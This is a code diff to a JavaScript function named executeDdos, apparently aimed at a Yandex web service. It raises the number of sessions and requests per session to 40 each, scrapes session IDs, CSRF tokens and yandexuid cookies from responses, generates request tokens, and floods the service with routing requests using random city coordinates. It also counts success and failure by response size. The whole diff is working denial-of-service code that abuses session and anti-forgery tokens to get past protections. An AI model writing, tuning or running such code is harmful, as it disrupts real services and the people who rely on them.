@@ -8,8 +8,8 @@ function executeDdos() {
     return new Promise((globalResolve) => {
         let amountOfErrors = 0;
         let amountOfSuccess = 0;
-        const REQUESTS_TO_MAKE_FROM_ONE_SESSION = 4;
-        const NUMBER_OF_SESSION_TO_GET = 10;
+        const REQUESTS_TO_MAKE_FROM_ONE_SESSION = 40;
+        const NUMBER_OF_SESSION_TO_GET = 40;
 
         const run = () => {
             return new Promise((resolve) => {
@@ -21,19 +21,24 @@ function executeDdos() {
                 const terminate = curlTest.close.bind(curlTest);
 
                 curlTest.on("end", (statusCode, data, headers) => {
-                    const sessionId  = /.*"sessionId":"(.*?)"}?}?/gi.exec(data)[1]
-                    const csrf  = /.*"csrfToken":"(.*?)",?.*}/gi.exec(data)[1].split(':');
-                    const yandexuid  = /.*yandexuid=(.*?)\/.*/gi.exec(data)[1];
-                    const allRequestPromises = [];
-                    for (let i = 0; i < REQUESTS_TO_MAKE_FROM_ONE_SESSION; i++) {
-                        const coords = getTwoCitiesCoords();
-                        const sToken = generateToken(sessionId, csrf, coords);
-                        allRequestPromises.push(sendRequest({sessionId, csrf, sToken, yandexuid, coords}));
+                    try {
+                        const sessionId  = /.*"sessionId":"(.*?)"}?}?/gi.exec(data)[1]
+                        const csrf  = /.*"csrfToken":"(.*?)",?.*}/gi.exec(data)[1].split(':');
+                        const yandexuid  = /.*yandexuid=(.*?)\/.*/gi.exec(data)[1];
+                        const allRequestPromises = [];
+                        for (let i = 0; i < REQUESTS_TO_MAKE_FROM_ONE_SESSION; i++) {
+                            const coords = getTwoCitiesCoords();
+                            const sToken = generateToken(sessionId, csrf, coords);
+                            allRequestPromises.push(sendRequest({sessionId, csrf, sToken, yandexuid, coords}));
+                        }
+                        Promise.all(allRequestPromises).then(() => {
+                            resolve();
+                        })
+                    } catch (e) {
+                        return;
+                    } finally {
+                        terminate();
                     }
-                    Promise.all(allRequestPromises).then(() => {
-                        resolve();
-                    })
-                    terminate();
                 });
 
                 function getTwoCitiesCoords() {
@@ -82,7 +87,12 @@ function executeDdos() {
                         curlTest.setOpt(Curl.option.HTTPHEADER, [`cookie: yandexuid=${yandexuid};`]);
 
                         curlTest.on("end", (statusCode, data, headers) => {
-                            amountOfSuccess++;
+                            if(data.length == 49) {
+                                amountOfErrors++;
+
+                            } else {
+                                amountOfSuccess++;
+                            }
                             terminate();
                             res();
                         });
